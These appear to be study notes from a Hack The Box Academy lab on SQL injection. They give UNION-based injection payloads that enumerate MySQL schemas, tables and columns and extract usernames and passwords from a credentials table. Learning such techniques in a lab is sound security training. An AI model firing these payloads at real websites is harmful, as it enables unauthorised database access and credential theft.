# Database Enumeration

## INFORMATION\_SCHEMA Database

The [INFORMATION\_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server.

```sql
SELECT * FROM my_database.users;
```

## SCHEMATA

[SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server. It is used to obtain database names so we can then query them.

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_dbs.png" alt=""><figcaption></figcaption></figure>

```sql
cn' UNION select 1,database(),2,3-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/db_name.jpg" alt=""><figcaption></figcaption></figure>

## TABLES

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_tables_1.jpg" alt=""><figcaption></figcaption></figure>

## COLUMNS

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_columns_1.jpg" alt=""><figcaption></figcaption></figure>

## Data

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

<figure><img src="https://academy.hackthebox.com/storage/modules/33/ports_credentials_1.png" alt=""><figcaption></figcaption></figure>





